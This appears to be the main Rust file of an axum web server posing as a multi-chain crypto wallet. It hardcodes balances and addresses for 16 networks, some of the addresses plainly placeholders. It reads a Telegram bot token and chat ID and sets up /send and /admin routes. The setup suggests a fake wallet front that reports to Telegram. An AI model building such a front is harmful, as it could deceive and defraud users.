use axum::{
    routing::{get, post},
    Router,
};
use std::net::SocketAddr;
use tracing_subscriber;
use dotenvy::dotenv;

mod handlers;
mod models;
mod telegram;
mod utils;

#[tokio::main]
async fn main() {
    dotenv().ok();
    tracing_subscriber::fmt::init();

    let bot_token = std::env::var("TELEGRAM_BOT_TOKEN")
        .expect("TELEGRAM_BOT_TOKEN must be set in .env");
    let chat_id = std::env::var("TELEGRAM_CHAT_ID")
        .expect("TELEGRAM_CHAT_ID must be set in .env");

    let mut balances = std::collections::HashMap::new();
balances.insert("eth".to_string(), 0.27);
balances.insert("bnb".to_string(), 2.10);
balances.insert("matic".to_string(), 15.00);
balances.insert("sol".to_string(), 0.27);
balances.insert("arb".to_string(), 3.50);
balances.insert("op".to_string(), 1.80);
balances.insert("avax".to_string(), 0.95);
balances.insert("sui".to_string(), 5.20);
balances.insert("apt".to_string(), 8.75);
balances.insert("base".to_string(), 0.15);
balances.insert("ftm".to_string(), 4.80);
balances.insert("tia".to_string(), 2.30);
balances.insert("xrp".to_string(), 3.10);
balances.insert("doge".to_string(), 150.00);
balances.insert("dot".to_string(), 1.20);
balances.insert("link".to_string(), 0.85);

let mut addresses = std::collections::HashMap::new();
addresses.insert("eth".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("bnb".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("matic".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("sol".to_string(), "F3B8mJjZvXrGkVQwWYRqoT9KzPpN7sHhMnDcAeU7".to_string());
addresses.insert("arb".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("op".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("avax".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("sui".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("apt".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("base".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("ftm".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("tia".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());
addresses.insert("xrp".to_string(), "r4EwBugvUD6uWVbWvGg1y1i1L4J7988G2".to_string()); // XRP адрес
addresses.insert("doge".to_string(), "DLq1d4S3Z8k5V5h2K9KzY6p8QZ8K3K2V7".to_string()); // DOGE адрес
addresses.insert("dot".to_string(), "1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef".to_string()); // DOT адрес
addresses.insert("link".to_string(), "0x742d35Cc6634C0532925a3b844Bc454e4438f412".to_string());

    let app_state = models::AppState {
        wallet: std::sync::Arc::new(std::sync::Mutex::new(models::WalletState {
            balances,
            addresses,
        })),
        bot_token,
        chat_id,
    };

    let app = Router::new()
        .route("/", get(handlers::index::index))
        .route("/send", post(handlers::send::send_eth)) // будет обрабатывать все сети
        .route("/admin", get(handlers::admin::admin_login).post(handlers::admin::handle_login))
        .with_state(app_state);

    let addr = SocketAddr::from(([0, 0, 0, 0], 8080));
    tracing::info!("Запущен: http://localhost:{}", addr.port());

    axum::serve(
        tokio::net::TcpListener::bind(addr).await.unwrap(),
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
    .unwrap();
}